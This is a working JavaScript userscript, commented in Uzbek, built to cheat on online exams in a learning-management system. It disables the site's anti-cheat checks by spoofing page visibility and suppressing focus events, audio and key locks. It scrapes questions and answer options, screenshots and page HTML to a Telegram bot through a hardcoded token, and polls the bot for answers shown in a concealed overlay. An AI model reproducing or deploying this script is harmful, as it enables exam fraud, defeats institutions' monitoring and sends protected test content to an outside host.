// == LMS ULTIMATE STEALTH PRO (Anti-Cheat Bypass + Telegram) ==
(function() {
    'use strict';

    // 1. Ikki marta ishlab ketishdan himoya
    if (window.__stealthProActive) return;
    window.__stealthProActive = true;

    // =========================================================
    // 🛡️ ANTI-CHEAT BYPASS (Sayt kuzatuvini kar va ko'r qilish)
    // =========================================================
    
    // Boshqa oyna (tab) ga o'tganda sahifa sezib qolmasligi uchun
    ['blur', 'focusout', 'mouseleave'].forEach(e => {
        window.addEventListener(e, ev => ev.stopImmediatePropagation(), true);
        document.addEventListener(e, ev => ev.stopImmediatePropagation(), true);
    });
    
    // Sahifa yashiringanini bildirmaslik
    document.addEventListener('visibilitychange', ev => ev.stopImmediatePropagation(), true);
    try {
        Object.defineProperty(document, 'hidden', { get: () => false });
        Object.defineProperty(document, 'visibilityState', { get: () => 'visible' });
    } catch(e) {} // Agar sayt bu funksiyani qulflab qo'ygan bo'lsa, xatolik bermasligi uchun

    // Sayt qandaydir ogohlantiruvchi ovoz chiqarishini taqiqlash
    if(typeof HTMLAudioElement !== 'undefined') {
        HTMLAudioElement.prototype.play = function() { return Promise.resolve(); };
    }

    // Klaviatura qulflarini yechish
    try {
        if (typeof jQuery !== 'undefined') {
            jQuery(document).off('keydown keypress keyup contextmenu');
            jQuery(window).off('keydown keypress keyup contextmenu');
        }
    } catch (e) {}


    // =========================================================
    // ⚙️ TELEGRAM VA ASOSIY SOZLAMALAR
    // =========================================================
    const telegramToken = '7189192224:AAEnNyUYC484cO9laStwCh3SU1LVyx9eHVg'; 
    const chatId = '-4878367805'; 
    let lastProcessedUpdateId = 0;
    
    let holdTimer = null;
    let elementUnderCursor = null;
    const HOLD_DURATION = 1200; // O'ng tugmani bosib turish vaqti

    // Konsolni yashirish
    const secretLog = function() {}; 

    function extractImageLinks(element) {
        if (!element) return '';
        const images = Array.from(element.querySelectorAll('img'));
        return images.map(img => img.src).join('\n');
    }

    function loadHtml2Canvas() {
        return new Promise((resolve, reject) => {
            if (window.html2canvas) return resolve();
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
    }

    // == Maxfiy Mini-oyna (Shadow DOM) ==
    let miniWindowHost, shadowRoot;
    function createMiniWindow() {
        miniWindowHost = document.createElement('div');
        miniWindowHost.style.all = 'initial'; 
        document.body.appendChild(miniWindowHost);
        shadowRoot = miniWindowHost.attachShadow({ mode: 'closed' }); 

        const miniWindowHTML = `
        <style>
            #mw-container {
                display: none;
                position: fixed;
                bottom: 10px;
                right: 10px;
                width: 220px;
                height: 250px;
                background: rgba(15, 15, 15, 0.9);
                border: 1px solid #444;
                border-radius: 8px;
                overflow-y: auto;
                z-index: 2147483647;
                font-family: Arial, sans-serif;
                color: #00ff00;
                padding: 10px;
                font-size: 13px;
                box-shadow: 0 4px 6px rgba(0,0,0,0.3);
                box-sizing: border-box;
            }
            #mw-container::-webkit-scrollbar { width: 5px; }
            #mw-container::-webkit-scrollbar-thumb { background: #666; border-radius: 3px; }
        </style>
        <div id="mw-container">
            <div id="mw-content">-- Ulanish tayyor --</div>
        </div>`;
        shadowRoot.innerHTML = miniWindowHTML;
    }

    function appendMessageToMiniWindow(message) {
        if (!shadowRoot) return;
        const content = shadowRoot.querySelector('#mw-content');
        if (!content) return;
        if (content.textContent.includes("--")) content.innerHTML = '';
        
        const msgEl = document.createElement('div');
        msgEl.style.marginBottom = '8px';
        msgEl.style.borderBottom = '1px solid #333';
        msgEl.style.paddingBottom = '4px';
        msgEl.innerHTML = message;
        content.appendChild(msgEl);
        content.parentElement.scrollTop = content.parentElement.scrollHeight;
    }

    function toggleMiniWindow() {
        if (!shadowRoot) return;
        const win = shadowRoot.querySelector('#mw-container');
        if (win) win.style.display = win.style.display === 'none' ? 'block' : 'none';
    }

    // == Telegram jo'natmalari ==
    async function sendMessageToTelegram(text) {
        try {
            await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' }),
            });
        } catch (error) {}
    }

    async function screenshotAndSend() {
        try {
            await loadHtml2Canvas();
            const canvas = await html2canvas(document.body, { scale: 1.2, useCORS: true });
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('document', blob, 'screenshot.png');
                await fetch(`https://api.telegram.org/bot${telegramToken}/sendDocument`, { method: 'POST', body: formData });
            }, 'image/png');
        } catch (error) {}
    }

    async function sendPageAsHtmlFile() {
        try {
            const htmlBlob = new Blob([document.documentElement.outerHTML], { type: 'text/html' });
            const fileName = (document.title || 'lms_page').replace(/[^a-z0-9]/gi, '_').toLowerCase() + '.html';
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', htmlBlob, fileName);
            await fetch(`https://api.telegram.org/bot${telegramToken}/sendDocument`, { method: 'POST', body: formData });
        } catch (error) {}
    }

    async function getNewAnswersFromTelegram() {
        try {
            const response = await fetch(`https://api.telegram.org/bot${telegramToken}/getUpdates?offset=${lastProcessedUpdateId + 1}&timeout=30`);
            if (!response.ok) return;
            const data = await response.json();
            if (data.ok && data.result) {
                data.result.forEach(update => {
                    if (update.message && update.message.text && update.update_id > lastProcessedUpdateId) {
                        lastProcessedUpdateId = update.update_id;
                        appendMessageToMiniWindow(update.message.text);
                    } else if (update.update_id > lastProcessedUpdateId) {
                        lastProcessedUpdateId = update.update_id;
                    }
                });
            }
        } catch (error) {}
    }

    // == Elementlarni boshqarish ==
    function findMeaningfulBlock(element) {
        if (!element) return null;
        let candidate = element.closest('p, div, li, h1, h2, h3, span, td, .test-question, .answers-test');
        if (candidate && candidate.textContent.trim().length > 10) return candidate;
        return element.textContent.trim().length > 5 ? element : null;
    }

    window.addEventListener('keyup', e => {
        const key = e.key.toLowerCase();
        if (key === 'x') screenshotAndSend();
        if (key === 'm') toggleMiniWindow();
        if (key === 'h') sendPageAsHtmlFile();
    }, true); 

    window.addEventListener('mousedown', (e) => {
        if (e.button === 2) { 
            elementUnderCursor = e.target;
            holdTimer = setTimeout(async () => {
                if (elementUnderCursor) {
                    const block = findMeaningfulBlock(elementUnderCursor);
                    if (block) {
                        const text = block.textContent?.trim();
                        const images = extractImageLinks(block);
                        if (text || images) {
                            let msg = `<b>Tanlangan:</b>\n<pre>${text.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>`;
                            if (images) msg += `\n\n<b>Rasmlar:</b>\n${images}`;
                            await sendMessageToTelegram(msg);
                            appendMessageToMiniWindow("<i>Qo'lda tanlangan matn yuborildi.</i>");
                        }
                    }
                }
                holdTimer = null;
            }, HOLD_DURATION);
        }
    }, true);

    window.addEventListener('mouseup', (e) => {
        if (e.button === 2 && holdTimer) {
            clearTimeout(holdTimer);
            holdTimer = null;
        }
    }, true);

    // == Parser ==
    async function processAndSendQuestions() {
        const tests = document.querySelectorAll('.table-test');
        if (tests.length === 0) return;

        const sortedTests = Array.from(tests).sort((a, b) => {
            return (parseInt(a.id.replace(/\D/g, ''), 10) || 0) - (parseInt(b.id.replace(/\D/g, ''), 10) || 0);
        });

        for (let i = 0; i < sortedTests.length; i++) {
            const test = sortedTests[i];
            const qEl = test.querySelector('.test-question');
            const qText = qEl?.querySelector('p')?.textContent.trim() || '';
            const qImgs = extractImageLinks(qEl);

            let msgContent = `<b>Savol ${i + 1}/${sortedTests.length}:</b>\n${qText}\n\n`;
            if (qImgs) msgContent += `<i>Rasmlar:</i>\n${qImgs}\n\n`;
            
            const answers = Array.from(test.querySelectorAll('.answers-test li')).map(li => {
                const variant = li.querySelector('.test-variant')?.textContent.trim() || '';
                const aText = li.querySelector('label p')?.textContent.trim() || '';
                const aImg = extractImageLinks(li);
                return `${variant}. ${aText} ${aImg ? `(Rasm: ${aImg})` : ''}`;
            });

            if (answers.length > 0) msgContent += '<b>Javoblar:</b>\n' + answers.join('\n');

            await sendMessageToTelegram(msgContent);
            await new Promise(r => setTimeout(r, 800)); 
        }
    }

    // == Ishga tushirish ==
    function main() {
        createMiniWindow();
        appendMessageToMiniWindow("✅ <b>Anti-Cheat bloklandi!</b><br>Bot muvaffaqiyatli ulandi.");
        setInterval(getNewAnswersFromTelegram, 3000); 
        setTimeout(processAndSendQuestions, 2000); 
    }

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        main();
    } else {
        document.addEventListener('DOMContentLoaded', main);
    }
})();
